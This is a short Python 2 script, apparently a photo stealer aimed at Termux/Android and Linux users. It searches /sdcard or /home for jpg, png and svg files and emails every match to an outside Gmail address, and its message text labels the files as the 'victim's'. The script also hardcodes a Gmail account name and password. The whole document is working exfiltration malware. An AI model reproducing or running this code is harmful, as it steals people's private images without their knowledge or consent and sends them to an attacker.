import os
from glob  import glob
import datetime
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
###########################################
gmail_user = "spyeagle2020@gmail.com"
gmail_pwd = "$$$spyeagle$$$"
to = "ledearhacking@gmail.com"
subject = "files"
text = "this files of  victim"

z = (
	'jpg',
	'png',
	'svg'
)
for i in z:
	star = (
		'/*',
                '/*/*',
                '/*/*/*',
                '/*/*/*/*',
                '/*/*/*/*/*',
                '/*/*/*/*/*/*',
		)
	for an in star:
##############################################################333
		try:
			heh = open("/data/data/com.termux/files/usr/bin/ls", "r" ).read()
			a = ('/sdcard{}/*.{}'.format(an, i))

		except:

			a = ('/home{}/*.{}'.format(an, i))
#################################################################
			for img in glob(a):
				print img
				attach = img
				msg = MIMEMultipart()
				msg['From'] = gmail_user
				msg['To'] = to
				msg['Subject'] = subject
				msg.attach(MIMEText(text))
				part = MIMEBase('application', 'octet-stream')
				part.set_payload(open(attach, 'rb').read())
				Encoders.encode_base64(part)
				part.add_header('Content-Disposition',
				'attachment; filename="%s"' % os.path.basename(attach))
				msg.attach(part)
				mailServer = smtplib.SMTP("smtp.gmail.com", 587)
				mailServer.ehlo()
				mailServer.starttls()
				mailServer.ehlo()
				mailServer.login(gmail_user, gmail_pwd)
				mailServer.sendmail(gmail_user, to, msg.as_string())
				mailServer.close()
